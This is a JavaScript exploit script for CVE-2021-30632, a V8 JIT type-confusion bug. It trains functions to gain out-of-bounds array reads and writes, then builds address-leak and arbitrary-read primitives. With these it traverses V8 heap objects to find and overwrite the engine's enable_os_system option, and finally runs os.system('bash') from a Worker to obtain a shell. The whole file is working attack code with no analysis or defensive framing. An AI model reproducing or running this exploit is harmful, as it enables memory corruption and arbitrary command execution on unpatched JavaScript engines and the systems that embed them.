var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module);
var main = instance.exports.main;


function foo(y) {
  x = y;
}

function oobRead() {
  //addrOf b[0] and addrOf writeArr::elements
  return [x[20],x[24]];
}

function oobWrite(addr) {
  x[24] = addr;
}

var arr0 = new Array(10); arr0.fill(1);arr0.a = 1;
var arr1 = new Array(10); arr1.fill(2);arr1.a = 1;
var arr2 = new Array(10); arr2.fill(3); arr2.a = 1;

var x = arr0;

var arr = new Array(30); arr.fill(4); arr.a = 1;
var b = new Array(1); b.fill(1);
var writeArr = [1.1];

for (let i = 0; i < 19321; i++) {
  if (i == 19319) arr2[0] = 1.1;
  foo(arr1);
}

x[0] = 1.1;

for (let i = 0; i < 20000; i++) {
  oobRead();
}

for (let i = 0; i < 20000; i++) oobWrite(1.1);
foo(arr);

var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);
b[0] = instance;
var addrs = oobRead();

function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}


dblArr[0] = addrs[0];
dblArr[1] = addrs[1];

function addrOf(obj) {
  b[0] = obj;
  let addrs = oobRead();
  dblArr[0] = addrs[0];
  return intView[1]; 
}

function arbRead(addr) {
  [elements, addr1] = ftoi32(addrs[1]);
  oobWrite(i32tof(addr,addr1));
  return writeArr[0];
}

function writeShellCode(rwxAddr, shellArr) {
  var intArr = new Uint8Array(400);
  var intArrAddr = addrOf(intArr);
  // console.log("intArray addr: " + intArrAddr.toString(16));
  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));
  // console.log("intBackingStore: " + ftoi(arbRead(intArrAddr + 0x20)).toString(16));

  var intArrMapAddr = ftoi(arbRead(intArrAddr - 0x08 + 0x00));
  // console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
  intArrMapAddr = intArrMapAddr & BigInt(0xFFFFFFFF);
  // console.log("intArrMapAddr: " + intArrMapAddr.toString(16));
  intArrMapAddr = Number(intArrMapAddr);

  var mapConstructorAddr = ftoi(arbRead(intArrMapAddr - 0x08 + 0x14));
  // console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
  mapConstructorAddr = mapConstructorAddr & BigInt(0xFFFFFFFF);
  // console.log("mapConstructorAddr: " + mapConstructorAddr.toString(16));
  mapConstructorAddr = Number(mapConstructorAddr);

  var constructorMapAddr = ftoi(arbRead(mapConstructorAddr - 0x08 + 0x00));
  // console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
  constructorMapAddr = constructorMapAddr & BigInt(0xFFFFFFFF);
  // console.log("constructorMapAddr: " + constructorMapAddr.toString(16));
  constructorMapAddr = Number(constructorMapAddr);

  var instanceDescriptors = ftoi(arbRead(constructorMapAddr - 0x08 + 0x18));
  // console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
  instanceDescriptors = instanceDescriptors & BigInt(0xFFFFFFFF);
  // console.log("instanceDescriptors: " + instanceDescriptors.toString(16));
  instanceDescriptors = Number(instanceDescriptors);

  var propertyLength = ftoi(arbRead(instanceDescriptors - 0x08 + 0x18));
  // console.log("propertyLength: " + propertyLength.toString(16));
  propertyLength = propertyLength & BigInt(0xFFFFFFFF);
  console.log('[+] Exploited! Run bash without --enable-os-system');
  propertyLength = Number(propertyLength);

  var lengthSetter = ftoi(arbRead(propertyLength - 0x08 + 0x10));
  // console.log("lengthSetter: " + lengthSetter.toString(16));
  lengthSetter = lengthSetter & BigInt(0xFFFFFFFF);
  // console.log("lengthSetter: " + lengthSetter.toString(16));
  lengthSetter = Number(lengthSetter);

  var foreignAddress = ftoi(arbRead(lengthSetter - 0x08 + 0x04));
  // console.log("foreignAddress: " + foreignAddress.toString(16));
  foreignAddress = Number(foreignAddress);

  // offsets from `foreign_address` to `options.enable_os_system`
  var optionAddr = foreignAddress + 0xdf48b0 + 0x9958 + 0x238;
  // console.log("optionAddr: " + optionAddr.toString(16));
  enableOsSystem = optionAddr + 0x8;
  // console.log("enableOsSystem: " + enableOsSystem.toString(16));

  enableOsSystem = BigInt(enableOsSystem);
  var highAddr = enableOsSystem >> BigInt(32);
  // console.log("highAddr: " + highAddr.toString(16));
  var lowAddr = enableOsSystem & BigInt(0xFFFFFFFF);
  // console.log("lowAddr: " + lowAddr.toString(16));
  rwxAddr = i32tof(Number(lowAddr), Number(highAddr));
  // console.log("rwxAddr: ", ftoi(rwxAddr).toString(16));

  [elements, addr1] = ftoi32(addrs[1]);
  oobWrite(i32tof(intArrAddr + 0x20, addr1));
  writeArr[0] = rwxAddr;
  for (let i = 0; i < shellArr.length; i++) {
    intArr[i] = shellArr[i];
  }
}
// Use CVE-2021-30632 to corrupt options->enable_os_system.

var instanceAddr = addrOf(instance);
var elementsAddr = ftoi32(addrs[1])[0];
var rwxAddr = arbRead(instanceAddr + 0x60);

var shellCode = [0x1]

writeShellCode(rwxAddr, shellCode);

main();

var workerScript = `os.system("bash")`;
var worker = new Worker(workerScript, {type: 'string'});

